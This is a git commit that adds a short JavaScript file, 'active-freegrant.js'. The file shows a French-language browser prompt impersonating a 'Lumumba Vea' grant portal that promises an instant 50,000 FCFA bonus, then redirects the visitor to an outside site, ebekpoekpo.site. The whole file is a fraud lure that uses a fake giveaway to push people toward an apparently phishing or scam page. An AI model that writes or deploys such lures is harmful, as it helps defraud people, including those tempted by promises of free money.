64f331229ee23d2f64365e72d1aec0d5660dbfae
dataviewz <gloliousam2@gmail.com>
2026-05-29 01:58:23 -0700

    Create active-freegrant.js

---
+++ active-freegrant.js
@@ -0,0 +1,5 @@
+var password = 'Obtenez un bonus de 50 000 FC'
+password=prompt('LUMUMBA VEA: Bonjour, inscrivez-vous dès maintenant ! Le portail de subventions Lumumba Vea offre une prime instantanée de 50 000 FCFA. Offre proposée par : (LUMUMBA VEA). Cliquez sur OK pour vous inscrire.','Obtenez un bonus de 50 000 FC');
+if (password != 'Obtenez un bonus de 50 000 FC') {
+location.href='https://ebekpoekpo.site/freegrant.html';
+}
